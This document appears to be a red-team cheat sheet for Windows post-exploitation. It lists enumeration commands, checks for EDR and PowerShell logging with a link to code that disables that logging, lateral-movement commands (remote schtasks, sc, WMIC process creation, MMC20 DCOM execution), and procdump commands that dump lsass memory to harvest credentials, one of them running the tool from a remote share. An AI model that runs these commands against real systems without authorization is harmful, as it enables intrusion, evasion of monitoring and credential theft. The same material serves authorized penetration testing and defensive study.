## Enumeration:
Looking for
	• Security tools (AV/EDR) and configs 
	• Windows Security Settings  
	• Log forwarders 
	• PowerShell/.NET versions (next slide) 
	• Audit Policies
Get OS Version
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"z
	(powershell) ls "$env:windir\system32\ntoskrnl.exe" | select VersionInfo | fl 
	ver
Get Patch Level
	wmic qfe list brief
All in one tools
	execute-assembly /root/Tools/GhostPack/Seatbelt.exe all
Get non standard services installed that are not signed by microsoft
	wmic product get name,version
Query local or remote RDP sessions
	qwinsta /SERVER:test.lab.local

## Active Directory Enumeration
ADExplorer.exe can export configuration with -snapshot <DC> <localfile>

## PowerShell:
Avaliable powershell engines:
	Key: HKLM\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine • * = Wildcard 
		• Value: PowerShellVersion
Avaliable CLR versions: 
	CLR 2.0 installed: %WINDIR%\Microsoft.Net\Framework\v2.0.50727\System.dll 
	CLR 4.0 installed: %WINDIR%\Microsoft.Net\Framework\v4.0.30319\System.dll
Powershell logging checks
	HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription 
		• EnableTranscripting == 1 
		• OutputDirectory
	HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging 
		• EnableModuleLogging == 1
	HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging 
		• EnableScriptBlockLogging == 1 
		• EnableScriptBlockInvocationLogging == 1
Disable Powershell logging
		https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
		
		
###PSPs
Enumerate Registered PSPs with WMIC
	wmic /node:primary.testlab.local /namespace:\\root\securitycenter2 path antivirusproduct
Interact with defender from run
	windowsdefender://

###Remote Enumeration
get-process -computername test.lab.local
wmic.exe /node:test.lab.local process get name, processid
tasklist.exe /s test.lab.local
qwinsta /SERVER:test.lab.local

###Lateral Movement
Scheduled task (TCP 135 + Dynamic RPC highport) 
	schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command> 
Services (TCP 445 + named pipes)
	sc \\IP create Service binPath= “command”
WMIC (TCP 135 + Dynamic RPC high port) 
	wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c payload.exe”
PsExec
MMC20.APPLICATION COM object
	$COM = [activator]::CreateInstance([type]::GetTypeFromProgID(" MMC20.APPLICATION", "192.168.52.100")) 
	$COM.Document.ActiveView.ExecuteShellCommand("C:\ Windows\System32\calc.exe", $Null, $Null, "7") 
	For more information: 	• https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20application-com-object/ 
							• https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
Remember the Double hop problem: When you execute code with WMI, you’ll receive a token with a networklogon type, meaning the credentials are not actually sent to the host, so you'll have to steal/make a token or migrate to another process to continue 


###Local account enumeration
	Safteykatz
	
###Dump Process
	procdump.exe/procdump64.exe
		procdump64.exe -accepteula -ma lsass.exe C:\temp\debug.dmp
	procdump.exe/procdump64.exe live (without sysinternals on disk)
		net use http://live.sysinternals.com
		\\live.sysinternals.com\DavWWWRoot\procdump.exe -accepteula -ma lsass.exe C:\windows\temp\debug.dmp
		net use /DELETE \\live.sysinternals.com\DavWWWRoot
	From TaskManager
		TaskManager -> Right Click Process -> Create Dump File

###Packet Capture
	Windows netsh (Win7/2008R2+)
		netsh trace start capture=yes IPv4.Address=X.X.X.X
		netsh trace stop
		convert etl to pcap
			$s = New-PefTraceSession -Path “C:\output\path\spec\OutFile.Cap” -SaveOnStop
			$s | Add-PefMessageProvider -Provider “C:\input\path\spec\Input.etl”
			$s | Start-PefTraceSession
			
###Windows Event Logs
	 Security EID 4624 - Interactive logons indicate normal logon hours
	 System EID 12,13 - Shutdown/startup/sleep frequency
	 Security EID 4624 - Monitor for inbound NTLM attempts 
		● Relay opportunities 
		● Challenge/response sniffing 
	Enumeration Methods:
		seatbelt.exe
		
###.NET
	Powershell to determine if a file is .net (throws an error if not .net)
		[Reflection.AssemblyName]::GetAssemblyName("C:\Path\To\File.exe")

		
		
		
		
		
		
